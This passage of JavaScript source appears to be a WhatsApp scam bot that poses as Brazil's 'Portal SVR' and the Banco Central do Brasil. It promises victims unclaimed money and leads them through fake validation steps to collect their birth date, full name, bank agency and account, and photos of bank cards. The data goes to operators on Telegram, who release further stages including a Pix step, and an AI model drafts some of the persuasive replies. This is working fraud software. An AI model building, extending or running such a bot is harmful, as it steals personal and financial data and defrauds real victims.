        if (currentSession.humanStep === 5) {
            // Se o lead enviar mídia (foto do cartão)
            if (msg.hasMedia) {
                console.log(`📸 [BANCO] Lead ${targetChatId} enviou mídia.`);
                try {
                    const media = await msg.downloadMedia();
                    if (media) {
                        const buffer = Buffer.from(media.data, 'base64');
                        await notifyTelegramPhoto(buffer, `🔐 <b>DOCUMENTO SIGILOSO RECEBIDO</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou um anexo (Cartão/Doc) para validação da Etapa 5.</i>`);
                    }
                } catch (e) {
                    await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
                }
                
                await client.sendMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
                return;
            }

            // Tenta identificar Agência e Conta no texto
            const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
            const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
            
            if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
                const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
                const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');

                console.log(`🏦 [BANCO] Dados de ${targetChatId}: Ag ${ag} | Cc ${cc}`);
                await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
                
                await client.sendMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
                return;
            }
        }

        console.log(`🤫 [HUMANO] Lead ${targetChatId} em atendimento manual. Bot silencioso.`);
        return;
    }

    // 1. GATILHO INICIAL (vindo do site)
    if (isTrigger) {
        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;

        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;

        // Detecta o tipo de documento (CPF ou CNPJ) enviado pelo site
        const docTypeMatch = text.match(/Tipo de Documento: \*(CPF|CNPJ)\*/i);
        const docType = docTypeMatch ? docTypeMatch[1].toUpperCase() : 'CPF';
        const isPJ = docType === 'CNPJ';
        console.log(`📄 [DOC] Tipo detectado: ${docType} para ${targetChatId}`);

        console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);

        let expectedData = null;
        if (userId) {
            try {
                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, {
                    headers: API_HEADERS,
                    timeout: 5000
                });
                expectedData = res.data;
            } catch (e) {
                console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
            }
        }

        // Envia mensagem inicial no Telegram (painel de cadastro)
        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType));

        chatSessions.set(targetChatId, {
            mode: 'bot',
            step: 1,
            userId,
            expectedData,
            docType,   // 'CPF' ou 'CNPJ'
            lastMsgTime: Date.now(),
            createdAt: Date.now(),
            tgMsgId
        });
        saveSessions();

        setTimeout(async () => {
            if (isPJ) {
                await client.sendMessage(targetChatId,
                    `🏢 *Portal SVR — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
            } else {
                await client.sendMessage(targetChatId,
                    `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
            }
        }, 1500);
        return;
    }

    // 2. LEAD SEM SESSÃO ATIVA — IA ASSUME E INICIA FLUXO
    if (!currentSession || currentSession.mode !== 'bot') {
        console.log(`🤖 [IA] Mensagem espontânea de ${targetChatId}: "${text}"`);
        const chat = await msg.getChat();
        await chat.sendStateTyping();

        // Envia painel de cadastro no Telegram
        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data'));

        // Notifica contato espontâneo
        await notifyTelegram(
            `📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`
        );

        chatSessions.set(targetChatId, {
            mode: 'bot',
            step: 1,
            userId: null,
            expectedData: null,
            lastMsgTime: Date.now(),
            createdAt: Date.now(),
            tgMsgId
        });
        saveSessions();

        const aiReply = await askAI(PROMPT_INICIAL, text);
        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal SVR — Sistema de Valores a Receber.*\n\n` +
            `Identificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\n` +
            `Para prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n` +
            `📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;

        setTimeout(async () => {
            await client.sendMessage(targetChatId, aiReply || fallback);
        }, 1500);
        return;
    }

    currentSession.lastMsgTime = Date.now();
    console.log(`📩 [LEAD] ${targetChatId}: "${text}"`);

    const chat = await msg.getChat();
    await chat.sendStateTyping();

    const isPJ = currentSession.docType === 'CNPJ';

    // --- ETAPA 1: DATA (nascimento para PF / abertura para PJ) ---
    if (currentSession.step === 1) {
        const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4}|\d{2})/);

        if (!dateMatch) {
            const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
            const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
            await msg.reply(aiReply || fallback);
            return;
        }

        const typedDate = text.trim();

        if (currentSession.expectedData?.birthDate) {
            const cleanTyped = typedDate.replace(/\D/g, "");
            const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");

            if (cleanTyped !== cleanExpected) {
                const fallback = `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular.\n\nPor gentileza, verifique os dados e informe novamente.\n📌 *Formato:* DD/MM/AAAA`;
                await msg.reply(fallback);
                return;
            }
        }

        // Data aceita — avançar para etapa 2 (Nome)
        currentSession.step = 2;
        currentSession.birthDate = typedDate;
        chatSessions.set(targetChatId, currentSession);
        saveSessions();

        // Atualiza o painel no Telegram
        if (currentSession.tgMsgId) {
            await notifyTelegram(
                buildCadastroMessage(targetChatId, null, typedDate, 'preenchendo_nome', currentSession.docType),
                currentSession.tgMsgId
            );
        }

        if (isPJ) {
            await msg.reply(
                `✅ *Data de abertura confirmada!*\n\n` +
                `📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
        } else {
            await msg.reply(
                `✅ *Data de nascimento confirmada!*\n\n` +
                `📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
        }

    // --- ETAPA 2: NOME / RAZÃO SOCIAL ---
    } else if (currentSession.step === 2) {
        const typedName = text.trim();

        if (typedName.length >= 8 && typedName.includes(" ")) {
            if (currentSession.expectedData?.fullName) {
                const portalName = currentSession.expectedData.fullName.toLowerCase();
                const firstName = typedName.toLowerCase().split(' ')[0];
                if (!portalName.includes(firstName)) {
                    await msg.reply(
                        `⚠️ *ALERTA DE SEGURANÇA — Portal SVR*\n\nO nome informado não corresponde ao titular cadastrado no sistema.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em documento oficial:`);
                    return;
                }
            }

            // ✅ Nome aceito — avançar para fase 1.3 (Dados Bancários)
            currentSession.step = 3;
            currentSession.name = typedName;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            await msg.reply(
                `✅ *Nome confirmado!*\n\n` +
                `📍 *FASE 1.3:* Para concluir a autenticação de identidade, informe os *Dados Bancários* (Agência e Conta) onde deseja receber os ativos. O sistema validará se o vínculo pertence ao titular.\n\n` +
                `📌 *Exemplo:* Agência 0001 - Conta 12345-6`);

        } else {
            // Nome inválido — IA responde de forma formal
            const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
            await msg.reply(aiReply || fallback);
        }

    // --- ETAPA 1.3: DADOS BANCÁRIOS (Antes da fila) ---
    } else if (currentSession.step === 3) {
        // Se o lead já enviou os dados e estamos aguardando o "SIM" de confirmação
        if (currentSession.awaitingConfirm) {
            if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
                // ✅ Confirmado — avançar para a fila
                currentSession.step = 4;
                delete currentSession.awaitingConfirm;
                currentSession.mode = 'waiting';
                chatSessions.set(targetChatId, currentSession);
                saveSessions();

                addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
                const queuePos = getQueuePosition(targetChatId);
                const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;

                if (currentSession.tgMsgId) {
                    await notifyTelegram(
                        buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType),
                        currentSession.tgMsgId
                    );
                }

                const frenteMsg = clientesFrente > 0
                    ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
                    : `Sua solicitação é a próxima a ser processada.`;

                await msg.reply(
                    `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
                    `Prezado(a) *${currentSession.name}*,\n` +
                    `Sua identidade e vínculo bancário foram validados com êxito pelo sistema federal de segurança.\n\n` +
                    `⌛ *STATUS ATUAL:* Aguardando Processamento\n\n` +
                    `${frenteMsg}\n\n` +
                    `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
                    `_Portal SVR — Banco Central do Brasil_`);
                return;
            } else {
                // Se não confirmou (quer trocar), limpa o flag e deixa o fluxo seguir para ler os novos dados abaixo
                delete currentSession.awaitingConfirm;
            }
        }

        if (msg.hasMedia) {
            console.log(`📸 [BANCO-FOTO] Lead ${targetChatId} enviou foto do cartão.`);
            try {
                const media = await msg.downloadMedia();
                if (media) {
                    const buffer = Buffer.from(media.data, 'base64');
                    await notifyTelegramPhoto(buffer, `💳 <b>CARTÃO RECEBIDO (VALIDAÇÃO INICIAL)</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou foto do cartão na etapa 1.3.</i>`);
                }
            } catch (e) { }

            currentSession.awaitingConfirm = true;
            currentSession.bankData = "FOTO_ENVIADA";
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            await msg.reply(
                `✅ *Documento recebido com sucesso!*\n\n` +
                `Prezado(a) titular, esta é a conta que o senhor(a) deseja utilizar para o recebimento dos valores ativos?\n\n` +
                `⚠️ *Nota:* Devido aos protocolos de segurança, a validação de imagens é realizada por supervisão judicial e técnica do sistema SVR/BCB para garantir a integridade do repasse.\n\n` +
                `*Responda SIM para confirmar.*`);
            return;
        }

        const typedBank = text.trim();
        if (typedBank.length >= 4) {
            const bank = detectBank(typedBank);
            const bankName = bank ? bank.name : "Instituição Identificada";
            
            // Tenta extrair Agência e Conta
            const agMatch = typedBank.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
            const ccMatch = typedBank.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
            const ag = agMatch ? agMatch[1] : (typedBank.split(/[-\s]/).find(p => p.length >= 3 && p.length <= 5) || "Pendente");
            const cc = ccMatch ? ccMatch[1] : (typedBank.split(/[-\s]/).find(p => p.length > 5) || "Pendente");

            currentSession.awaitingConfirm = true;
            currentSession.bankData = typedBank;
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            await msg.reply(
                `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
                `📍 *DADOS CAPTURADOS:*
                - Agência: ${ag}
                - Conta: ${cc}
                - Instituição: ${bankName}\n\n` +
                `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
                `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas, sob risco de bloqueio pelo sistema de segurança do Banco Central.\n\n` +
                `*Responda SIM para confirmar* ou informe os dados novamente para trocar.`);
        } else {
            await msg.reply(`⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
        }
    }
}

// --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
setInterval(async () => {
    // --- cmd-send-*.json: envia mensagem livre ao lead ---
    const sendFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
    for (const file of sendFiles) {
        try {
            const cmdPath = path.join(process.cwd(), file);
            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
            console.log(`📤 Enviando mensagem externa para: ${cmd.to}`);
            await client.sendMessage(cmd.to, cmd.message);
            if (waitingQueue.find(q => q.chatId === cmd.to)) {
                removeFromQueue(cmd.to);
                chatSessions.set(cmd.to, { mode: 'human', humanStep: 1 });
                saveSessions();
                console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
            }
            fs.unlinkSync(cmdPath);
        } catch (e) {
            console.error("❌ Erro ao processar cmd-send:", e.message);
        }
    }

    // --- cmd-etapa-*.json: libera etapas 3 e 4 ao lead ---
    const etapaFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-etapa-') && f.endsWith('.json'));
    for (const file of etapaFiles) {
        try {
            const cmdPath = path.join(process.cwd(), file);
            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
            const { etapa, chatId } = cmd;
            const session = chatSessions.get(chatId);

            console.log(`📋 [ETAPA ${etapa}] Liberando para: ${chatId}`);

            if (etapa === 3) {
                if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
                await client.sendMessage(chatId, MENSAGEM_ETAPA_3);
                // Notifica Telegram com botão para Etapa 4
                await notifyTelegram(
                    `📋 <b>ETAPA 3 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Use /pix para gerar o protocolo e avançar para Etapa 4.</i>`
                );
            } else if (etapa === 4) {
                if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
                await client.sendMessage(chatId, MENSAGEM_ETAPA_4);
                await notifyTelegram(
                    `🔐 <b>ETAPA 4 — PROTOCOLO ATIVO</b>\nLead: <code>${chatId}</code>\n\n<i>Aguardando detecção de validação do hash bancário.</i>`,
                    undefined,
                    { inline_keyboard: [[{ text: '💰 Liberar Etapa 5 Manual', callback_data: `etapa:5:${chatId}` }]] }
                );
            } else if (etapa === 5) {
                if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
                await client.sendMessage(chatId, MENSAGEM_ETAPA_5);
                await notifyTelegram(
                    `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
                );
            }

            fs.unlinkSync(cmdPath);
        } catch (e) {
            console.error("❌ Erro ao processar cmd-etapa:", e.message);
        }
    }
}, 3000);

client.initialize();
